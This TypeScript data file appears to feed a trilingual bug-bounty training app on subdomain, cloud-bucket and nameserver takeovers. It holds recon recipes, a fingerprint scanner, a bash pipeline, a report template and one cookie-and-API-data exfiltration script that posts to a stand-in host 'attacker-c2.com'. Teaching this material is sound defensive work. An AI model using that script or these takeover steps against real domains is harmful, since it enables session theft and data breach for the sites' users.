import type { Lang } from "./types";

export interface TakeoverScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface TakeoverTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "cname_takeover" | "ns_takeover" | "cookie_stealing" | "s3_bucket_takeover" | "mx_takeover";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: TakeoverScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface TakeoverPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface TakeoverToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "python_scanner" | "bash_pipeline" | "fingerprint_db";
  code: string;
  language: "python" | "bash" | "json";
  howToUse: Record<Lang, string>;
}

export interface TakeoverReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP SUBDOMAIN & CLOUD TAKEOVER TECHNIQUES ──────────────────────────────
export const TAKEOVER_TECHNIQUES: TakeoverTechnique[] = [
  {
    id: "dangling-cname-subdomain-takeover",
    title: {
      en: "Dangling CNAME Subdomain Takeover (AWS S3, GitHub Pages, Azure, Zendesk)",
      simple: "Claiming an Abandoned Cloud Subdomain to Host Your Own Website on Target.com",
      hi: "टारगेट कंपनी के पुराने CNAME रिकॉर्ड को अपने क्लाउड अकाउंट में क्लेम करके सबडोमेन टेकओवर करना",
    },
    category: "cname_takeover",
    difficulty: "beginner",
    successRate: "85% on Fortune 500 & Enterprise Bug Bounty Programs with 1000+ Subdomains",
    summary: {
      en: "When companies retire marketing campaigns, documentation sites, or cloud microservices, engineers frequently delete the AWS S3 bucket, GitHub repository, Azure Web App, or Zendesk helpdesk, but FORGET to delete the DNS CNAME record (`help.target.com -> target.zendesk.com`). An attacker simply creates a new account on that cloud platform, registers the exact unclaimed name, and gains 100% control over the company's subdomain.",
      simple: "A company deletes their old Zendesk help page or AWS bucket, but leaves the link active in their domain settings. You can go to Zendesk or AWS, create that exact name, and now their official subdomain displays your page!",
      hi: "कंपनी ने AWS या GitHub से अपनी साइट डिलीट कर दी, लेकिन DNS से CNAME डिलीट करना भूल गई। आप उसी नाम से AWS या GitHub पर नया अकाउंट बनाकर उनका ऑफिशियल सबडोमेन अपने कब्जे में ले सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Unclaimed AWS S3 Bucket Subdomain Takeover",
          simple: "Claiming S3 Bucket to Host Phishing on target.com",
          hi: "AWS S3 बकेट क्लेम करके कंपनी के सबडोमेन पर पेज दिखाना",
        },
        description: {
          en: "DNS lookup shows `assets.target.com CNAME assets-target.s3-website-us-east-1.amazonaws.com`. Visiting returns 'NoSuchBucket'. Attacker creates S3 bucket with name 'assets-target' in us-east-1.",
          simple: "The subdomain points to an S3 bucket that doesn't exist. You create that bucket name in AWS and take over the subdomain.",
          hi: "सबडोमेन S3 बकेट पर पॉइंट कर रहा है जो डिलीट हो चुकी है ('NoSuchBucket')। आप AWS में उसी नाम की बकेट बनाकर टेकओवर कर लेते हैं।",
        },
        commandOrRequest: `# Step 1: DNS reconnaissance
$ dig assets.target.com CNAME +short
assets-target.s3.amazonaws.com.

# Step 2: HTTP Probe reveals unclaimed bucket
$ curl -i http://assets.target.com
HTTP/1.1 404 Not Found
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>NoSuchBucket</Code>
  <Message>The specified bucket does not exist</Message>
  <BucketName>assets-target</BucketName>
</Error>`,
        responseSample: `# Step 3: Attacker registers bucket in AWS Console & uploads index.html:
$ curl -i http://assets.target.com
HTTP/1.1 200 OK
Content-Type: text/html

<h1>PoC Subdomain Takeover by BugHunter</h1>`,
        impact: {
          en: "Attacker can host phishing pages, serve malicious JavaScript, bypass CORS policies, and steal session cookies scoped to *.target.com.",
          simple: "Full control of an official company subdomain with valid SSL certificate.",
          hi: "कंपनी के ऑफिशियल सबडोमेन पर कब्जा, फ़िशिंग और कुकीज की चोरी।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Run extensive subdomain enumeration on target: `subfinder -d target.com -all | dnsx -cname -resp`.",
        simple: "Find all subdomains and check which ones have CNAME records.",
        hi: "सबडोमेन ढूंढें और उनके CNAME रिकॉर्ड्स निकालें।",
      },
      {
        en: "Filter for CNAMEs pointing to cloud providers: `s3.amazonaws.com`, `github.io`, `azurewebsites.net`, `zendesk.com`, `herokuapp.com`.",
        simple: "Look for CNAMEs pointing to AWS, GitHub, Azure, or Zendesk.",
        hi: "AWS, GitHub, Azure आदि पर पॉइंट करने वाले CNAMEs अलग करें।",
      },
      {
        en: "Curl each subdomain. Look for telltale error fingerprints: `NoSuchBucket` (AWS), `There isn't a GitHub Pages site here` (GitHub), `404 Not Found - No such app` (Heroku).",
        simple: "Check if visiting the subdomain returns 'NoSuchBucket' or 'Site not found'.",
        hi: "चेक करें कि क्या 'NoSuchBucket' या 'No such app' एरर आ रहा है।",
      },
      {
        en: "Claim the resource safely on the corresponding cloud platform. Upload a static harmless proof-of-concept file.",
        simple: "Create the bucket/page in your cloud account to prove the vulnerability safely.",
        hi: "अपने क्लाउड अकाउंट में उसी नाम से बकेट बनाकर एक सेफ PoC फाइल अपलोड करें।",
      },
    ],
    burpOrToolRule: [
      "nuclei -t takeovers/ -u https://assets.target.com",
      "dnsx -l subdomains.txt -cname -resp",
      "subjack -w subdomains.txt -t /fingerprints.json -o takeovers.txt",
    ],
    hunterProTip: {
      en: "Never host defacements or malicious files! Always upload a harmless text file containing: 'PoC Subdomain Takeover by [Your HackerOne Username] for Bug Bounty Verification'. Triage teams reward polite, non-destructive PoCs immediately!",
      simple: "Always use a safe PoC file with your hacker username! Never deface the website.",
      hi: "कभी भी साइट पर कुछ गलत पोस्ट न करें! सिर्फ अपना हैकर यूजरनेम और 'PoC for Bug Bounty' लिखकर अपलोड करें।",
    },
  },
  {
    id: "second-order-cookie-stealing-takeover",
    title: {
      en: "Second-Order Takeovers: Stealing Enterprise Session Cookies & Breaking Wildcard CORS",
      simple: "Using a Taken-Over Subdomain to Automatically Receive Users' Private Cookies and Passwords",
      hi: "टेकओवर किए गए सबडोमेन से पैरेंट डोमेन (.target.com) की सारी कुकीज और लॉगिन सेशन चुराना",
    },
    category: "cookie_stealing",
    difficulty: "intermediate",
    successRate: "90% Impact Escalation on Confirmed Takeovers",
    summary: {
      en: "A subdomain takeover on its own is often treated as Medium/High by triage. To elevate the payout to a Critical $10,000+ bounty, hunters demonstrate Second-Order Exploitation: If the parent domain sets cookies with `Domain=.target.com` (as most enterprise SSO apps do), those cookies are automatically transmitted to ANY subdomain, including the attacker-controlled one. Furthermore, APIs configuring `Access-Control-Allow-Origin: *.target.com` allow the attacker subdomain to make authenticated credentialed AJAX requests.",
      simple: "When a company sets cookies for '.target.com', those cookies are sent to ALL subdomains. If you take over one old subdomain, every user who visits it sends you their login cookies, turning a Medium bug into a Critical P1!",
      hi: "जब वेबसाइट कुकी में `Domain=.target.com` सेट करती है, तो वो कुकी हर सबडोमेन पर जाती है। एक पुराने सबडोमेन को टेकओवर करके आप विक्टिम्स की सारी लॉगिन कुकीज चुरा सकते हैं और बग को सीधा P1 बना सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Ambient Session Cookie Harvester on Taken-Over Subdomain",
          simple: "Stealing .target.com Cookies via JavaScript on Subdomain",
          hi: "सबडोमेन पर जावास्क्रिप्ट लगाकर पैरेंट डोमेन की कुकीज चुराना",
        },
        description: {
          en: "Attacker takes over `promo.target.com`. Attacker hosts script that reads `document.cookie` (for non-HttpOnly cookies) and makes authenticated cross-origin fetch requests to `api.target.com` to steal customer data.",
          simple: "Use the taken-over subdomain to read cookies and make API calls to the main site.",
          hi: "सबडोमेन से मेन वेबसाइट की API को कॉल करके डेटा चुराना।",
        },
        commandOrRequest: `// Hosted on https://promo.target.com (attacker controlled):
<script>
  // 1. Read loose domain cookies
  const cookies = document.cookie;
  
  // 2. Exploit wildcard CORS: api.target.com allows *.target.com
  fetch("https://api.target.com/v1/user/me", {
    credentials: "include"
  })
  .then(res => res.json())
  .then(data => {
    // 3. Exfiltrate to attacker C2
    navigator.sendBeacon("https://attacker-c2.com/log", JSON.stringify({
      cookies: cookies,
      privateProfile: data
    }));
  });
</script>`,
        responseSample: `// In attacker server logs:
{
  "cookies": "_target_session=s%3A99182312...; user_id=4921;",
  "privateProfile": {"email": "victim@target.com", "balance": "$14,500.00"}
}`,
        impact: {
          en: "Immediate escalation from Subdomain Takeover (High) to full Enterprise Account Takeover & Data Breach (Critical).",
          simple: "Turns a subdomain takeover into full access to all user accounts.",
          hi: "सबडोमेन टेकओवर से सीधे फुल अकाउंट टेकओवर और डेटा ब्रीच।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Once a subdomain takeover is proven, inspect cookies on `https://target.com`.",
        simple: "Check if the main website sets cookies with Domain=.target.com.",
        hi: "मेन वेबसाइट की कुकीज चेक करें कि क्या उनमें `Domain=.target.com` लगा है।",
      },
      {
        en: "Check API CORS headers: Send `Origin: https://subdomain.target.com` to `https://api.target.com`.",
        simple: "Test if the API accepts your subdomain in the Origin header.",
        hi: "चेक करें कि क्या API आपके सबडोमेन को CORS में स्वीकार करती है।",
      },
      {
        en: "If `Access-Control-Allow-Credentials: true` is returned, write an exploit script demonstrating cross-origin data extraction.",
        simple: "Demonstrate that your subdomain can read private user API data.",
        hi: "दिखाएं कि सबडोमेन से सीधे यूज़र का प्राइवेट डेटा निकाला जा सकता है।",
      },
    ],
    burpOrToolRule: [
      "Test CORS: curl -H 'Origin: https://promo.target.com' -i https://api.target.com/user",
      "Look for: Access-Control-Allow-Origin: https://promo.target.com & Credentials: true",
    ],
    hunterProTip: {
      en: "Remember OAuth Redirect Whitelists! Over 70% of OAuth implementations register `https://*.target.com/callback` as an approved redirect URI. By hosting an authorization code receiver on your taken-over subdomain, you can hijack OAuth login flows company-wide!",
      simple: "Most companies whitelist *.target.com for OAuth logins. Your taken-over subdomain can steal all login codes!",
      hi: "कंपनियां OAuth में `*.target.com` की अनुमति देती हैं। आपके सबडोमेन से कंपनी के सारे लॉगिन कोड्स चुराए जा सकते हैं!",
    },
  },
  {
    id: "dangling-ns-nameserver-takeover",
    title: {
      en: "Dangling NS (Name Server) Delegation: 100% Full Domain & Email Takeover",
      simple: "Taking Over the Whole Subdomain's DNS to Issue SSL Certificates and Intercept Emails",
      hi: "Dangling NS रिकॉर्ड को क्लेम करके पूरे DNS ज़ोन और ईमेल्स पर 100% कंट्रोल हासिल करना",
    },
    category: "ns_takeover",
    difficulty: "advanced",
    successRate: "50% on AWS Route 53 & DigitalOcean DNS delegations",
    summary: {
      en: "When an organization delegates a subdomain (`dev.target.com`) to external nameservers (such as AWS Route 53 `ns-123.awsdns-15.com` or DigitalOcean `ns1.digitalocean.com`) and later deletes the hosted zone in their AWS/DigitalOcean account without cleaning up the parent NS records, an attacker can create zones in their own AWS/DigitalOcean account until Route 53 assigns the exact same nameservers. Once matched, the attacker has complete authority over the subdomain's entire DNS tree (A, AAAA, MX, TXT, CNAME).",
      simple: "If a company points a subdomain to AWS or DigitalOcean nameservers and deletes the zone, you can recreate that zone in your own cloud account. You now control all DNS records, can receive all emails sent to that domain, and issue official SSL certificates.",
      hi: "कंपनी ने AWS Route 53 से ज़ोन डिलीट कर दिया, लेकिन पेरेंट डोमेन में NS रिकॉर्ड छोड़ दिया। आप अपने AWS में ज़ोन बनाकर पूरे DNS पर कब्जा कर सकते हैं और उस डोमेन के सारे ईमेल्स पढ़ सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "AWS Route 53 Dangling NS Zone Recreation",
          simple: "Recreating Deleted Route 53 Hosted Zone",
          hi: "डिलीटेड Route 53 ज़ोन को अपने अकाउंट में री-क्रिएट करना",
        },
        description: {
          en: "Subdomain `corp.target.com` has NS records pointing to AWS Route 53, but querying them returns SERVFAIL or REFUSED. Attacker creates Route 53 zones until matching the 4 assigned nameservers.",
          simple: "Query the NS records. If you get SERVFAIL, the zone was deleted. You recreate it in AWS.",
          hi: "NS रिकॉर्ड्स क्वेरी करने पर SERVFAIL आने का मतलब है कि ज़ोन डिलीट हो चुका है। आप उसे AWS में री-क्रिएट कर लेते हैं।",
        },
        commandOrRequest: `$ dig corp.target.com NS +short
ns-182.awsdns-22.com.
ns-741.awsdns-28.net.
ns-1312.awsdns-36.org.
ns-1981.awsdns-55.co.uk.

# Querying authoritative nameserver directly returns REFUSED:
$ dig @ns-182.awsdns-22.com corp.target.com A
;; ->>HEADER<<- opcode: QUERY, status: REFUSED`,
        responseSample: `# Attacker runs Python script generating Route 53 zones until matching ns-182/741/1312/1981:
[+] MATCH FOUND on Zone ID Z0991823!
[+] You now control all DNS records for corp.target.com!
[+] Adding A record -> Attacker IP
[+] Adding MX record -> Attacker Mail Server`,
        impact: {
          en: "Absolute domain compromise: issue legitimate Let's Encrypt SSL certificates, intercept all incoming email traffic, and spoof internal corporate infrastructure.",
          simple: "100% control of DNS, ability to receive all emails and generate SSL certificates.",
          hi: "पूरे DNS पर 100% कंट्रोल — असली SSL सर्टिफिकेट्स बनाना और सारे ईमेल्स पढ़ना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify subdomains with delegated NS records: `dnsx -l subdomains.txt -ns -resp`.",
        simple: "Find subdomains that have NS records pointing to AWS or DigitalOcean.",
        hi: "AWS या DigitalOcean पर पॉइंट करने वाले NS रिकॉर्ड्स ढूंढें।",
      },
      {
        en: "Query the designated nameservers directly. Look for `REFUSED` or `SERVFAIL` status.",
        simple: "Check if the nameservers return REFUSED (meaning zone is abandoned).",
        hi: "चेक करें कि क्या स्टेटस `REFUSED` आ रहा है (मतलब ज़ोन डिलीटेड है)।",
      },
      {
        en: "For DigitalOcean or Azure DNS, simply create the zone in your dashboard (first-come first-served).",
        simple: "On DigitalOcean, just add the domain to your account to claim it immediately.",
        hi: "DigitalOcean पर सीधे अपने डैशबोर्ड में डोमेन जोड़कर तुरंत क्लेम करें।",
      },
      {
        en: "For Route 53, run our automated zone generation script until your account is allocated the matching 4 nameservers.",
        simple: "For AWS, run the python script to generate matching nameservers.",
        hi: "AWS के लिए हमारी पायथन स्क्रिप्ट चलाकर मैचिंग नेम-सर्वर हासिल करें।",
      },
    ],
    burpOrToolRule: [
      "dig @<target-ns> <subdomain> +trace",
      "Look for: status: REFUSED or status: SERVFAIL",
    ],
    hunterProTip: {
      en: "DigitalOcean DNS is the easiest NS takeover in the world! DigitalOcean does NOT randomize nameservers (they are always ns1.digitalocean.com, ns2, ns3). If a company delegates a domain to DigitalOcean and deletes the project, anyone can add that domain into a free DigitalOcean account and instantly take it over in 5 seconds!",
      simple: "DigitalOcean nameservers are always the same! Any abandoned DigitalOcean domain can be claimed instantly in 5 seconds for free.",
      hi: "DigitalOcean के नेम-सर्वर हमेशा सेम होते हैं! अगर कोई कंपनी DigitalOcean प्रोजेक्ट डिलीट करती है, तो आप 5 सेकंड में फ्री अकाउंट से पूरा डोमेन टेकओवर कर सकते हैं!",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY ───────────────────────────────────────────────────
export const TAKEOVER_METHODOLOGY_PHASES: TakeoverPhase[] = [
  {
    phase: 1,
    title: {
      en: "Mass Subdomain Discovery & DNS Mapping",
      simple: "Finding Every Subdomain and DNS Record",
      hi: "सारे सबडोमेन्स और DNS रिकॉर्ड्स की मैपिंग",
    },
    objective: {
      en: "Discover active and inactive subdomains, resolving their CNAME, NS, A, and AAAA records across passive and active DNS datasets.",
      simple: "Find all subdomains and check where their DNS points.",
      hi: "सारे सबडोमेन्स निकालकर देखना कि उनका CNAME कहां जा रहा है।",
    },
    steps: [
      {
        en: "Enumerate passive subdomains using subfinder, assetfinder, and crt.sh certificate transparency logs.",
        simple: "Use subfinder and crt.sh to discover subdomains.",
        hi: "subfinder और crt.sh से सबडोमेन्स की लिस्ट निकालें।",
      },
      {
        en: "Resolve all records using massdns and dnsx to isolate CNAME chains: `dnsx -l subs.txt -cname -resp -o cnames.txt`.",
        simple: "Use dnsx to extract all CNAME records.",
        hi: "dnsx टूल से सारे CNAME रिकॉर्ड्स अलग करें।",
      },
      {
        en: "Inspect NS records for third-party cloud DNS delegation: `dnsx -l subs.txt -ns -resp -o ns.txt`.",
        simple: "Extract all nameservers to identify delegated cloud zones.",
        hi: "नेम-सर्वर रिकॉर्ड्स अलग करके क्लाउड डेलीगेशन चेक करें।",
      },
    ],
    keyTargets: ["*.target.com CNAMEs", "*.target.com NS", "Certificate Transparency Logs"],
    commandsOrPayloads: [
      "subfinder -d target.com -all -silent | dnsx -cname -resp -silent",
      "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Fingerprint Analysis & Cloud Service Matching",
      simple: "Matching Errors Against Cloud Providers",
      hi: "एरर मैसेज को क्लाउड प्रोवाइडर की लिस्ट से मिलाना",
    },
    objective: {
      en: "Compare HTTP responses and DNS resolution codes against known takeover signatures across 60+ cloud services.",
      simple: "Check if any subdomain returns an unclaimed cloud error.",
      hi: "चेक करें कि क्या किसी सबडोमेन पर 'NoSuchBucket' या 'Site not found' जैसा एरर है।",
    },
    steps: [
      {
        en: "Probe each CNAME endpoint with httpx: `httpx -l cnames.txt -status-code -title -web-server`.",
        simple: "Probe all CNAME targets with httpx to see status codes.",
        hi: "httpx से स्टेटस कोड और एरर मैसेज चेक करें।",
      },
      {
        en: "Check for standard signatures: `NoSuchBucket` (AWS), `404 Not Found - GitHub Pages`, `The specified bucket does not exist` (GCP), `Project Not Found` (Surge).",
        simple: "Look for known error strings that indicate an abandoned service.",
        hi: "मैलिशियस/अनक्लेम्ड एरर स्ट्रिंग्स की पहचान करें।",
      },
      {
        en: "Cross-reference against the can-i-take-over-xyz repository database.",
        simple: "Check the can-i-take-over-xyz database to see if the service is vulnerable.",
        hi: "can-i-take-over-xyz डेटाबेस से कन्फर्म करें कि सर्विस टेकओवर संभव है या नहीं।",
      },
    ],
    keyTargets: ["AWS S3", "GitHub Pages", "Zendesk", "Azure Web Apps", "Heroku", "Shopify"],
  },
  {
    phase: 3,
    title: {
      en: "Safe Proof-of-Concept Claim & Verification",
      simple: "Claiming the Resource Safely",
      hi: "सुरक्षित तरीके से रिसोर्स क्लेम करके PoC साबित करना",
    },
    objective: {
      en: "Claim the unclaimed resource without disrupting existing services, demonstrating ownership for the triage team.",
      simple: "Create the bucket or project in your own account to prove it works.",
      hi: "अपने क्लाउड अकाउंट में बकेट बनाकर साबित करें कि सबडोमेन आपके कंट्रोल में है।",
    },
    steps: [
      {
        en: "Register the matching resource name on the cloud provider (e.g. create the S3 bucket or GitHub repository).",
        simple: "Register the exact name in your cloud provider dashboard.",
        hi: "क्लाउड प्रोवाइडर पर जाकर उसी नाम से बकेट या रेपो बनाएं।",
      },
      {
        en: "Upload a non-destructive verification file: e.g. a plain text file containing your researcher username.",
        simple: "Upload a simple text file with your username.",
        hi: "एक सादा टेक्स्ट फाइल अपलोड करें जिसमें आपका यूजरनेम लिखा हो।",
      },
      {
        en: "Verify via curl that `http://subdomain.target.com/poc.txt` returns your verification string.",
        simple: "Verify that visiting the subdomain displays your text file.",
        hi: "चेक करें कि क्या सबडोमेन पर आपका टेक्स्ट फाइल लोड हो रहा है।",
      },
    ],
    keyTargets: ["S3 Bucket Creation", "GitHub Pages Settings", "Zendesk Subdomain Setup"],
  },
  {
    phase: 4,
    title: {
      en: "Blast Radius & Second-Order Impact Assessment",
      simple: "Testing Cookie Theft and OAuth Hijacking",
      hi: "कुकीज की चोरी और OAuth हाईजैकिंग का इम्पैक्ट साबित करना",
    },
    objective: {
      en: "Determine how the compromised subdomain interacts with the rest of the company's domain tree.",
      simple: "Show the real security risk to get the highest possible bounty payout.",
      hi: "साबित करें कि इस सबडोमेन से कंपनी के यूज़र्स और डेटा को कितना बड़ा खतरा है।",
    },
    steps: [
      {
        en: "Inspect cookies set by the apex domain (`.target.com`). Can the subdomain read them?",
        simple: "Check if parent domain cookies are accessible to the subdomain.",
        hi: "चेक करें कि क्या पैरेंट डोमेन की कुकीज सबडोमेन तक पहुंच रही हैं।",
      },
      {
        en: "Check OAuth redirect whitelists: Does `https://*.target.com` allow the subdomain to steal auth codes?",
        simple: "Test if the subdomain is whitelisted in OAuth redirects.",
        hi: "चेक करें कि क्या OAuth में वाइल्डकार्ड सबडोमेन की अनुमति है।",
      },
      {
        en: "Test CORS origin matching on central APIs: Does `api.target.com` trust `subdomain.target.com`?",
        simple: "Check if main APIs allow requests from this subdomain.",
        hi: "चेक करें कि क्या मेन API इस सबडोमेन से डेटा शेयर करने को तैयार है।",
      },
    ],
    keyTargets: ["Domain Cookies (.target.com)", "OAuth redirect_uri", "CORS Allowed Origins"],
  },
  {
    phase: 5,
    title: {
      en: "Remediation & DNS Hygiene Verification",
      simple: "Fixing the Vulnerability and Deleting Dead Records",
      hi: "DNS से पुराने रिकॉर्ड्स हटाकर समस्या का स्थायी समाधान",
    },
    objective: {
      en: "Guide engineering teams to delete orphaned DNS records and establish continuous DNS monitoring.",
      simple: "Advise the company to delete the dangling DNS record immediately.",
      hi: "कंपनी को गाइड करें कि कैसे लावारिस DNS रिकॉर्ड्स को हटाया जाए।",
    },
    steps: [
      {
        en: "Immediately remove the dangling CNAME or NS record from the authoritative DNS zone.",
        simple: "Delete the CNAME record from DNS management.",
        hi: "DNS मैनेजमेंट से उस CNAME या NS रिकॉर्ड को तुरंत डिलीट करें।",
      },
      {
        en: "Adopt Route 53 Alias records instead of standard CNAMEs when pointing to AWS resources.",
        simple: "Use Route 53 Alias records which automatically prevent takeovers.",
        hi: "AWS रिसोर्सेज के लिए CNAME की जगह Route 53 Alias रिकॉर्ड्स का उपयोग करें।",
      },
      {
        en: "Release the claimed proof-of-concept resource once triage has verified and closed the report.",
        simple: "Delete your test bucket once the bounty team confirms the report.",
        hi: "बाउंटी टीम द्वारा रिपोर्ट कन्फर्म करने के बाद अपनी टेस्ट बकेट डिलीट कर दें।",
      },
    ],
    keyTargets: ["DNS Record Deletion", "Route 53 Alias Records", "Terraform Drift Management"],
  },
];

// ─── 3. EXPLOIT SCRIPTS & TOOLS STASH ────────────────────────────────────────
export const TAKEOVER_TOOLS_STASH: TakeoverToolSnippet[] = [
  {
    id: "python-cname-takeover-auditor",
    title: {
      en: "Python Multi-Provider Subdomain Takeover Scanner",
      simple: "Automated Python Tool to Scan 50+ Cloud Takeover Fingerprints",
      hi: "50+ क्लाउड प्रोवाइडर्स के टेकओवर फिंगरप्रिंट्स चेक करने वाला पायथन स्कैनर",
    },
    description: {
      en: "Resolves CNAME records for a list of subdomains, queries the target via HTTP, and inspects response bodies against verified takeover signatures (AWS S3, GitHub Pages, Heroku, Azure, Zendesk, Shopify, Fastly, Cloudfront).",
      simple: "Scans a list of subdomains and flags any that are ready to be taken over.",
      hi: "सबडोमेन्स की लिस्ट को स्कैन करके तुरंत बताता है कि कौन सा सबडोमेन टेकओवर किया जा सकता है।",
    },
    category: "python_scanner",
    language: "python",
    code: `import requests
import dns.resolver
import sys

# Top Verified Fingerprints from can-i-take-over-xyz
FINGERPRINTS = {
    "AWS S3": ["The specified bucket does not exist", "NoSuchBucket"],
    "GitHub Pages": ["There isn't a GitHub Pages site here", "For root URLs (like http://example.com/)"],
    "Heroku": ["No such app", "herokucdn.com/error-pages/no-such-app.html"],
    "Azure Web App": ["404 Web Site not found", "app service - page not found"],
    "Zendesk": ["Help Center Closed", "No such host"],
    "Shopify": ["Sorry, this shop is currently unavailable"],
    "Surge.sh": ["project not found"],
    "Fastly": ["Fastly error: unknown domain"],
    "Ghost": ["The thing you were looking for is no longer here"]
}

def check_subdomain(subdomain):
    try:
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        cname = str(answers[0].target).rstrip('.')
        
        # Check HTTP response
        url = f"http://{subdomain}"
        r = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        body = r.text
        
        for provider, signatures in FINGERPRINTS.items():
            for sig in signatures:
                if sig in body:
                    print(f"\\n[!] VULNERABLE SUBDOMAIN TAKEOVER DETECTED!")
                    print(f"    Subdomain: {subdomain}")
                    print(f"    CNAME:     {cname}")
                    print(f"    Provider:  {provider}")
                    print(f"    Signature: '{sig}'\\n")
                    return True
        print(f"[-] Clean: {subdomain} -> {cname}")
    except dns.resolver.NoAnswer:
        pass
    except dns.resolver.NXDOMAIN:
        pass
    except Exception as e:
        pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 takeover_scanner.py <subdomains_file.txt>")
        sys.exit(1)
        
    with open(sys.argv[1], "r") as f:
        subs = [line.strip() for line in f if line.strip()]
        
    print(f"[*] Loaded {len(subs)} subdomains to audit...")
    for sub in subs:
        check_subdomain(sub)`,
    howToUse: {
      en: "Install dependencies: `pip install dnspython requests`. Run: `python3 takeover_scanner.py subdomains.txt`.",
      simple: "Install dnspython and requests, then run `python3 takeover_scanner.py subdomains.txt`.",
      hi: "`pip install dnspython requests` करें और `python3 takeover_scanner.py subdomains.txt` चलाएं।",
    },
  },
  {
    id: "bash-takeover-pipeline",
    title: {
      en: "High-Speed Bash Subdomain Takeover Enumeration Pipeline",
      simple: "Complete Recon One-Liner from Domain to Confirmed Takeover",
      hi: "डोमेन से लेकर टेकओवर तक पूरा ऑटोमेटेड बैश पाइपलाइन",
    },
    description: {
      en: "Pipes subfinder through dnsx and nuclei with dedicated takeover templates to find dangling CNAMEs in under 60 seconds.",
      simple: "One command to find all subdomains and test them for takeovers.",
      hi: "एक ही कमांड में सारे सबडोमेन ढूंढकर टेकओवर चेक करने वाला पाइपलाइन।",
    },
    category: "bash_pipeline",
    language: "bash",
    code: `#!/usr/bin/env bash
# Usage: ./takeover_pipeline.sh target.com

TARGET="\${1:-target.com}"
OUTDIR="recon_$TARGET"
mkdir -p "$OUTDIR"

echo "[*] Step 1: Enumerating subdomains for $TARGET..."
subfinder -d "$TARGET" -all -silent -o "$OUTDIR/subs.txt"

echo "[*] Step 2: Extracting active CNAME and NS records..."
dnsx -l "$OUTDIR/subs.txt" -cname -resp -silent -o "$OUTDIR/cnames.txt"
dnsx -l "$OUTDIR/subs.txt" -ns -resp -silent -o "$OUTDIR/ns_records.txt"

echo "[*] Step 3: Scanning with Nuclei Takeover Templates..."
nuclei -l "$OUTDIR/subs.txt" -t http/takeovers/ -o "$OUTDIR/takeover_results.txt"

if [ -s "$OUTDIR/takeover_results.txt" ]; then
  echo "\\n[+] CRITICAL: TAKEOVERS DETECTED!"
  cat "$OUTDIR/takeover_results.txt"
else
  echo "[*] No direct takeover signatures matched. Inspect $OUTDIR/cnames.txt for manual review."
fi`,
    howToUse: {
      en: "Make executable: `chmod +x takeover_pipeline.sh` then run `./takeover_pipeline.sh company.com`.",
      simple: "Run `./takeover_pipeline.sh company.com` to scan a target.",
      hi: "`chmod +x takeover_pipeline.sh` करके `./takeover_pipeline.sh company.com` चलाएं।",
    },
  },
];

// ─── 4. P1/P2 REPORT TEMPLATES ────────────────────────────────────────────────
export const TAKEOVER_REPORT_TEMPLATES: TakeoverReportTemplate[] = [
  {
    id: "rep-subdomain-takeover-s3",
    title: {
      en: "High Severity Subdomain Takeover of assets.target.com via Unclaimed AWS S3 Bucket",
      simple: "Subdomain Takeover on assets.target.com via Abandoned S3 Bucket",
      hi: "assets.target.com पर लावारिस S3 बकेट के कारण सबडोमेन टेकओवर",
    },
    vulnType: "CWE-284: Improper Access Control (Subdomain Takeover)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (8.6 - High)",
    severity: "high",
    reportMarkdown: `## Summary:
The subdomain \`assets.target.com\` is vulnerable to Subdomain Takeover. The DNS zone contains a dangling CNAME record pointing to an Amazon AWS S3 bucket (\`assets-target.s3.amazonaws.com\`) which was deleted from the target organization's AWS account.

Because the DNS record was never purged, any AWS user can claim the bucket name \`assets-target\` in the matching AWS region, gaining complete control over the content served on \`assets.target.com\`.

An attacker can host convincing phishing forms, serve malicious JavaScript to steal enterprise session cookies scoped to \`.target.com\`, and bypass wildcard CORS policies across corporate APIs.

---

## Technical Details:
- **Vulnerable Host:** \`assets.target.com\`
- **Dangling CNAME:** \`assets-target.s3.amazonaws.com\`
- **Observed HTTP Status:** \`HTTP/1.1 404 Not Found\` with XML response \`<Code>NoSuchBucket</Code>\`
- **Region:** \`us-east-1\`

---

## Step-by-Step Reproduction:
1. Query the DNS records for the subdomain:
   \`\`\`bash
   $ dig assets.target.com CNAME +short
   assets-target.s3.amazonaws.com.
   \`\`\`

2. Verify that the bucket does not exist:
   \`\`\`bash
   $ curl -i http://assets.target.com
   HTTP/1.1 404 Not Found
   <Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message></Error>
   \`\`\`

3. In an AWS account, create a new S3 bucket named \`assets-target\` in the \`us-east-1\` region.
4. Enable Static Website Hosting on the bucket.
5. Upload a benign proof-of-concept file:
   - File: \`index.html\`
   - Content: \`Proof of Concept Subdomain Takeover by [Researcher Username] for Bug Bounty Verification\`
6. Access \`http://assets.target.com\`. The verification page renders cleanly from the newly registered bucket.

---

## Impact:
- **Severity:** High (8.6)
- **Reputational Damage:** Attacker can host fraudulent or malicious materials under an official company subdomain.
- **Session Hijacking:** Ability to capture session cookies configured with \`Domain=.target.com\`.
